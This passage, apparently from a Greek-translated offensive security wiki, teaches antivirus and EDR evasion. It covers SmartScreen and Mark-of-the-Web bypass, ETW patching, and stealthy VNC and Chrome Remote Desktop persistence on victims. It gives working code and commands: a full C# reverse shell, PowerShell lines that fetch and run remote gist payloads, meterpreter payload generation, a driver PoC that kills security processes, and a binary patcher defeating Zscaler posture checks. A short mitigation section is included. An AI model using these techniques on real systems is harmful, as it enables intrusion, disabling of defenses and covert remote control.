- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει ένα επίπεδο από obfuscated operations που δημιουργούνται από το C++ template metaprogramming framework, το οποίο θα κάνει τη ζωή του ατόμου που θέλει να crack-άρει την εφαρμογή λίγο πιο δύσκολη.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Το Alcatraz είναι ένας x64 binary obfuscator ικανός να obfuscate διάφορα pe αρχεία όπως: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Το Metame είναι μια απλή metamorphic code engine για αυθαίρετα executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): Το ROPfuscator είναι ένα λεπτομερές code obfuscation framework για γλώσσες που υποστηρίζονται από LLVM, χρησιμοποιώντας ROP (return-oriented programming). Το ROPfuscator obfuscates ένα πρόγραμμα σε επίπεδο assembly code μετασχηματίζοντας κανονικές εντολές σε ROP chains, υπονομεύοντας την φυσική μας αντίληψη της κανονικής ροής ελέγχου.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Το Nimcrypt είναι ένας .NET PE Crypter γραμμένος σε Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Το Inceptor μπορεί να μετατρέψει υπάρχοντα EXE/DLL σε shellcode και στη συνέχεια να τα φορτώσει

## SmartScreen & MoTW

Ίσως έχετε δει αυτήν την οθόνη όταν κατεβάζετε κάποια executables από το διαδίκτυο και τα εκτελείτε.

Το Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφάλειας που στοχεύει στην προστασία του τελικού χρήστη από την εκτέλεση πιθανώς κακόβουλων εφαρμογών.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

Το SmartScreen λειτουργεί κυρίως με προσέγγιση βασισμένη στη φήμη, πράγμα που σημαίνει ότι εφαρμογές που κατεβάζονται σπάνια θα ενεργοποιήσουν το SmartScreen, ειδοποιώντας και αποτρέποντας τον τελικό χρήστη από το να εκτελέσει το αρχείο (αν και το αρχείο μπορεί ακόμα να εκτελεστεί κάνοντας κλικ στο More Info -> Run anyway).

**MoTW** (Mark of The Web) είναι ένα [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με το όνομα Zone.Identifier που δημιουργείται αυτόματα κατά τη λήψη αρχείων από το διαδίκτυο, μαζί με το URL από το οποίο κατέβηκε.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Έλεγχος του Zone.Identifier ADS για ένα αρχείο που κατέβηκε από το Διαδίκτυο.</p></figcaption></figure>

> [!TIP]
> Είναι σημαντικό να σημειωθεί ότι εκτελέσιμα υπογεγραμμένα με ένα **έμπιστο** signing certificate **δεν θα ενεργοποιήσουν το SmartScreen**.

Ένας πολύ αποτελεσματικός τρόπος για να εμποδίσετε τα payloads σας από το να αποκτήσουν το Mark of The Web είναι να τα πακετάρετε μέσα σε κάποιο κοντέινερ όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **δεν μπορεί** να εφαρμοστεί σε **μη NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα εργαλείο που πακετάρει payloads σε output containers για να αποφύγει το Mark-of-the-Web.

Παράδειγμα χρήσης:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Εδώ είναι ένα demo για την παράκαμψη του SmartScreen με τη συσκευασία payloads μέσα σε αρχεία ISO χρησιμοποιώντας [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Το Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός καταγραφής στα Windows που επιτρέπει σε εφαρμογές και συστατικά του συστήματος να **καταγράφουν συμβάντα**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από security products για να παρακολουθούν και να εντοπίζουν κακόβουλες δραστηριότητες.

Παρόμοια με το πώς το AMSI απενεργοποιείται (παρακάμπτεται), είναι επίσης δυνατό να κάνετε τη συνάρτηση **`EtwEventWrite`** της διαδικασίας user space να επιστρέφει αμέσως χωρίς να καταγράφει συμβάντα. Αυτό επιτυγχάνεται με την τροποποίηση (patching) της συνάρτησης στη μνήμη ώστε να επιστρέφει άμεσα, απενεργοποιώντας ουσιαστικά την ETW καταγραφή για εκείνη τη διαδικασία.

Μπορείτε να βρείτε περισσότερες πληροφορίες στις **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) και [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Η φόρτωση C# binaries στη μνήμη είναι γνωστή εδώ και καιρό και παραμένει ένας πολύ καλός τρόπος για να τρέχετε τα post-exploitation εργαλεία σας χωρίς να εντοπίζεστε από AV.

Εφόσον το payload θα φορτωθεί απευθείας στη μνήμη χωρίς να γραφτεί στο δίσκο, το μόνο που πρέπει να μας απασχολεί είναι το patching του AMSI για ολόκληρη τη διαδικασία.

Οι περισσότερες C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, κ.λπ.) ήδη παρέχουν τη δυνατότητα να εκτελούν C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι για να το κάνετε:

- **Fork\&Run**

Αυτό περιλαμβάνει το **spawning a new sacrificial process**, την έγχυση του post-exploitation malicious κώδικα σε αυτή τη νέα διαδικασία, την εκτέλεση του κακόβουλου κώδικα και όταν τελειώσει, τη διακοπή της νέας διαδικασίας. Αυτό έχει πλεονεκτήματα και μειονεκτήματα. Το πλεονέκτημα της μεθόδου fork and run είναι ότι η εκτέλεση συμβαίνει **εκτός** της Beacon implant διαδικασίας μας. Αυτό σημαίνει ότι αν κάτι στην post-exploitation ενέργειά μας πάει στραβά ή αν εντοπιστεί, υπάρχει **πολύ μεγαλύτερη πιθανότητα** το **implant να επιβιώσει.** Το μειονέκτημα είναι ότι έχετε **μεγαλύτερη πιθανότητα** να εντοπιστείτε από **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Πρόκειται για την έγχυση του post-exploitation malicious κώδικα **στην ίδια τη διαδικασία**. Με αυτόν τον τρόπο, μπορείτε να αποφύγετε τη δημιουργία νέας διαδικασίας και το να σαρωθεί από AV, αλλά το μειονέκτημα είναι ότι αν κάτι πάει στραβά με την εκτέλεση του payload σας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon** καθώς μπορεί να καταρρεύσει.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Αν θέλετε να διαβάσετε περισσότερα για C# Assembly loading, δείτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Μπορείτε επίσης να φορτώσετε C# Assemblies **από PowerShell**, δείτε [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και το βίντεο του S3cur3th1sSh1t (https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Όπως προτείνεται στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατό να εκτελέσετε κακόβουλο κώδικα χρησιμοποιώντας άλλες γλώσσες δίνοντας στο συμβιβασμένο μηχάνημα πρόσβαση **στο interpreter environment εγκατεστημένο στο Attacker Controlled SMB share**.

Επιτρέποντας πρόσβαση στα Interpreter Binaries και στο environment στο SMB share μπορείτε να **εκτελέσετε arbitrary code σε αυτές τις γλώσσες μέσα στη μνήμη** του συμβιβασμένου μηχανήματος.

Το repo αναφέρει: Defender εξακολουθεί να σκανάρει τα scripts αλλά με τη χρήση Go, Java, PHP κλπ έχουμε **περισσότερη ευελιξία για να παρακάμψουμε static signatures**. Δοκιμές με τυχαία μη απο-περιθωριοποιημένα reverse shell scripts σε αυτές τις γλώσσες αποδείχθηκαν επιτυχείς.

## TokenStomping

Το Token stomping είναι μια τεχνική που επιτρέπει σε έναν attacker να **χειριστεί το access token ή ένα security product όπως ένα EDR ή AV**, επιτρέποντάς του να μειώσει τα δικαιώματά του ώστε η διαδικασία να μην τερματιστεί αλλά να μην έχει δικαιώματα να ελέγχει για κακόβουλες δραστηριότητες.

Για να προληφθεί αυτό, τα Windows θα μπορούσαν να **αποτρέπουν εξωτερικές διαδικασίες** από το να αποκτούν handles πάνω στα tokens των security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Όπως περιγράφεται σε [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο να εγκαταστήσετε το Chrome Remote Desktop σε έναν υπολογιστή θύματος και στη συνέχεια να το χρησιμοποιήσετε για να τον αναλάβετε και να διατηρήσετε persistence:
1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
2. Εκτελέστε τον installer σιωπηλά στο θύμα (απαιτούνται δικαιώματα admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Επιστρέψτε στη σελίδα Chrome Remote Desktop και πατήστε next. Ο οδηγός θα ζητήσει να εξουσιοδοτήσετε· πατήστε το κουμπί Authorize για συνέχεια.
4. Εκτελέστε την δοθείσα παράμετρο με μερικές προσαρμογές: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Σημειώστε την παράμετρο --pin που επιτρέπει να ορίσετε το PIN χωρίς να χρησιμοποιήσετε το GUI).


## Advanced Evasion

Η evasion είναι ένα πολύ περίπλοκο θέμα· μερικές φορές πρέπει να λάβετε υπόψη πολλές διαφορετικές πηγές telemetry σε ένα μόνο σύστημα, οπότε είναι πρακτικά αδύνατο να παραμείνετε εντελώς αόρατοι σε ώριμα περιβάλλοντα.

Κάθε περιβάλλον που θα αντιμετωπίσετε θα έχει τα δικά του δυνατά και αδύνατα σημεία.

Συνιστώ ανεπιφύλακτα να παρακολουθήσετε αυτή την ομιλία από [@ATTL4S](https://twitter.com/DaniLJ94), για να αποκτήσετε μια εισαγωγή σε πιο Advanced Evasion τεχνικές.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Αυτή είναι επίσης μια άλλη εξαιρετική ομιλία από [@mariuszbit](https://twitter.com/mariuszbit) σχετικά με Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Μπορείτε να χρησιμοποιήσετε το [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) το οποίο θα **αφαιρεί μέρη του binary** μέχρι να **εντοπίσει ποιο μέρος ο Defender** βρίσκει ως κακόβουλο και να σας το αναλύσει.\
Ένα άλλο εργαλείο που κάνει το **ίδιο** είναι το [**avred**](https://github.com/dobin/avred) με μια ανοιχτή web υπηρεσία στην [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Μέχρι τα Windows10, όλα τα Windows περιελάμβαναν έναν **Telnet server** που μπορούσατε να εγκαταστήσετε (ως administrator) κάνοντας:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Κάνε το **start** όταν ξεκινάει το σύστημα και **run** το τώρα:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Αλλαγή telnet port** (stealth) και απενεργοποίηση firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**ON THE HOST**: Εκτελέστε _**winvnc.exe**_ και ρυθμίστε τον διακομιστή:

- Ενεργοποιήστε την επιλογή _Disable TrayIcon_
- Ορίστε έναν κωδικό στο _VNC Password_
- Ορίστε έναν κωδικό στο _View-Only Password_

Στη συνέχεια, μετακινήστε το δυαδικό _**winvnc.exe**_ και το **νεοδημιουργημένο** αρχείο _**UltraVNC.ini**_ μέσα στο **victim**

#### **Reverse connection**

Ο **attacker** θα πρέπει να **εκτελέσει μέσα** στον **host** το δυαδικό `vncviewer.exe -listen 5900` ώστε να είναι **prepared** να πιάσει μια reverse **VNC connection**. Στη συνέχεια, μέσα στο **victim**: Εκκινήστε το daemon `winvnc.exe -run` και τρέξτε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

ΠΡΟΣΟΧΗ: Για να διατηρήσετε τη διακριτικότητα δεν πρέπει να κάνετε τα εξής

- Μην ξεκινήσετε `winvnc` αν ήδη τρέχει ή θα ενεργοποιήσετε ένα [popup](https://i.imgur.com/1SROTTl.png). Ελέγξτε αν τρέχει με `tasklist | findstr winvnc`
- Μην ξεκινήσετε `winvnc` χωρίς το `UltraVNC.ini` στον ίδιο φάκελο ή θα ανοίξει [το παράθυρο ρυθμίσεων](https://i.imgur.com/rfMQWcf.png)
- Μην τρέξετε `winvnc -h` για βοήθεια ή θα ενεργοποιήσετε ένα [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Μέσα στο GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Τώρα **ξεκίνησε τον lister** με `msfconsole -r file.rc` και **εκτέλεσε** το **xml payload** με:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Ο τρέχων defender θα τερματίσει τη διεργασία πολύ γρήγορα.**

### Μεταγλώττιση του δικού μας reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Πρώτο C# Revershell

Μεταγλωττίστε το με:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Χρησιμοποιήστε το με:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using μεταγλωττιστής
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Αυτόματη λήψη και εκτέλεση:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Λίστα obfuscators για C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Χρήση python για παράδειγμα build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Άλλα εργαλεία
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Περισσότερα

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 αξιοποίησε ένα μικρό console utility γνωστό ως **Antivirus Terminator** για να απενεργοποιήσει endpoint protections πριν αποθέσει ransomware. Το εργαλείο φέρνει τον **δικό του ευάλωτο αλλά *signed* driver** και τον καταχράται για να εκτελέσει privileged kernel operations που ακόμη και Protected-Process-Light (PPL) AV services δεν μπορούν να μπλοκάρουν.

Κύρια σημεία
1. **Signed driver**: Το αρχείο που γράφεται στο δίσκο είναι `ServiceMouse.sys`, αλλά το binary είναι ο νόμιμα υπογεγραμμένος driver `AToolsKrnl64.sys` από το Antiy Labs’ “System In-Depth Analysis Toolkit”. Επειδή ο driver φέρει έγκυρη Microsoft signature φορτώνει ακόμη και όταν είναι ενεργοποιημένο το Driver-Signature-Enforcement (DSE).
2. **Εγκατάσταση υπηρεσίας**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Η πρώτη γραμμή καταχωρεί τον driver ως **kernel service** και η δεύτερη τον ξεκινά ώστε `\\.\ServiceMouse` να γίνει προσβάσιμο από user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Δυνατότητα                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Τερματίζει μια αυθαίρετη διαδικασία από PID (χρησιμοποιείται για το κλείσιμο Defender/EDR υπηρεσιών) |
| `0x990000D0` | Διαγράφει ένα αυθαίρετο αρχείο στο δίσκο |
| `0x990001D0` | Αποφορτώνει τον driver και αφαιρεί την υπηρεσία |

Ελάχιστο proof-of-concept σε C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Γιατί λειτουργεί**:  BYOVD παρακάμπτει εντελώς τις προστασίες σε user-mode· κώδικας που εκτελείται στον kernel μπορεί να ανοίξει *προστατευμένες* διεργασίες, να τις τερματίσει, ή να παραμορφώσει αντικείμενα του kernel ανεξαρτήτως PPL/PP, ELAM ή άλλων χαρακτηριστικών ενίσχυσης.

Ανίχνευση / Αντιμετώπιση
•  Ενεργοποιήστε τη vulnerable-driver block list της Microsoft (`HVCI`, `Smart App Control`) ώστε τα Windows να αρνούνται τη φόρτωση του `AToolsKrnl64.sys`.
•  Παρακολουθείστε τη δημιουργία νέων *kernel* υπηρεσιών και ειδοποιήστε όταν ένας driver φορτώνεται από έναν κατάλογο με δικαιώματα εγγραφής για όλους ή όταν δεν υπάρχει στη λίστα επιτρεπόμενων.
•  Παρακολουθείστε για handles σε user-mode προς προσαρμοσμένα device objects ακολουθούμενα από ύποπτες κλήσεις `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Το Zscaler’s **Client Connector** εφαρμόζει κανόνες device-posture τοπικά και βασίζεται στο Windows RPC για να επικοινωνήσει τα αποτελέσματα σε άλλα components. Δύο αδύναμες σχεδιαστικές επιλογές καθιστούν δυνατή μια πλήρη παράκαμψη:

1. Η αξιολόγηση posture γίνεται **ολόκληρη στον client** (ένα boolean αποστέλλεται στον server).
2. Τα εσωτερικά RPC endpoints επικυρώνουν μόνο ότι το συνδεόμενο εκτελέσιμο είναι **signed by Zscaler** (μέσω `WinVerifyTrust`).

Με το **patching τεσσάρων signed binaries στο δίσκο** και οι δύο μηχανισμοί μπορούν να εξουδετερωθούν:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Επιστρέφει πάντα `1` οπότε κάθε έλεγχος θεωρείται συμβατός |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ οποιαδήποτε (ακόμη και μη υπογεγραμμένη) διεργασία μπορεί να bind στους RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Αντικαταστάθηκε με `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Συντομεύθηκε / παρακάμφθηκε |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Μετά την αντικατάσταση των αρχικών αρχείων και την επανεκκίνηση του service stack:

* **Όλοι** οι έλεγχοι κατάστασης εμφανίζονται **πράσινοι/συμβατοί**.
* Μη υπογεγραμμένα ή τροποποιημένα binaries μπορούν να ανοίξουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ο παραβιασμένος host αποκτά πλήρη πρόσβαση στο εσωτερικό δίκτυο που ορίζεται από τις πολιτικές της Zscaler.

Αυτή η μελέτη περίπτωσης δείχνει πώς οι καθαρά client-side αποφάσεις εμπιστοσύνης και απλοί έλεγχοι υπογραφής μπορούν να παρακαμφθούν με λίγα byte patches.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) επιβάλλει μια signer/level ιεραρχία έτσι ώστε μόνο προστατευμένες διεργασίες ίσου ή μεγαλύτερου επιπέδου να μπορούν να παραβιάσουν η μία την άλλη. Επιθετικά, αν μπορείτε νόμιμα να εκκινήσετε ένα PPL-enabled binary και να ελέγξετε τα arguments του, μπορείτε να μετατρέψετε μια ακίνδυνη λειτουργία (π.χ., logging) σε ένα περιορισμένο, PPL-backed write primitive εναντίον προστατευμένων directories που χρησιμοποιούνται από AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- Η διεργασία πρέπει να δημιουργηθεί με CreateProcess χρησιμοποιώντας τις σημαίες: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Βοηθητικό ανοιχτού κώδικα: CreateProcessAsPPL (επιλέγει protection level και προωθεί τα arguments στο target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Σχήμα χρήσης:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Το υπογεγραμμένο system binary `C:\Windows\System32\ClipUp.exe` αυτο-εκκινεί και δέχεται μια παράμετρο για να γράψει ένα αρχείο καταγραφής σε διαδρομή που καθορίζει ο καλών.
- Όταν εκκινείται ως PPL process, η εγγραφή αρχείου γίνεται με PPL backing.
- ClipUp δεν μπορεί να parse paths που περιέχουν spaces· χρησιμοποίησε 8.3 short paths για να δείξεις σε συνήθως προστατευμένες τοποθεσίες.

8.3 short path helpers
- Εμφάνιση short names: `dir /x` σε κάθε parent directory.
- Παράγωγη short path στο cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Εκκίνησε το PPL-capable LOLBIN (ClipUp) με `CREATE_PROTECTED_PROCESS` χρησιμοποιώντας έναν launcher (π.χ. CreateProcessAsPPL).
